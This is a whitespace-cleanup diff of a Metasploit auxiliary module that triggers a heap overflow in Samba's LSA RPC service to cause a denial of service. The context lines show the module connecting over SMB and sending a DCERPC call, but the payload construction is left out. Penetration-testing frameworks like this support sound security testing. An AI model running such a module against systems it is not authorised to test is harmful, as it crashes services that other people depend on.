@@ -3,7 +3,7 @@
 ##
 
 ##
-# This file is part of the Metasploit Framework and may be subject to 
+# This file is part of the Metasploit Framework and may be subject to
 # redistribution and commercial restrictions. Please see the Metasploit
 # Framework web site for more information on licensing and terms of use.
 # http://metasploit.com/framework/
@@ -17,10 +17,10 @@ class Metasploit3 < Msf::Auxiliary
 
 	include Msf::Exploit::Remote::DCERPC
 	include Msf::Exploit::Remote::SMB
-	include Msf::Auxiliary::Dos	
+	include Msf::Auxiliary::Dos
 
 	def initialize(info = {})
-		super(update_info(info,	
+		super(update_info(info,
 			'Name'           => 'Samba lsa_io_trans_names Heap Overflow',
 			'Description'    => %q{
 				This module triggers a heap overflow in the LSA RPC service
@@ -35,18 +35,18 @@ class Metasploit3 < Msf::Auxiliary
 					['OSVDB', '34699'],
 				]
 			))
-			
+
 		register_options(
 			[
 				OptString.new('SMBPIPE', [ true,  "The pipe name to use", 'LSARPC']),
 			], self.class)
-						
+
 	end
 
 	def run
-	
+
 		pipe = datastore['SMBPIPE'].downcase
-				
+
 		print_status("Connecting to the SMB service...")
 		connect()
 		smb_login()
@@ -82,10 +82,10 @@ class Metasploit3 < Msf::Auxiliary
 				raise e
 			end
 		end
-		
+
 		dcerpc.call(0x0f, stub)
-		
-		disconnect	
+
+		disconnect
 	end
 
 end
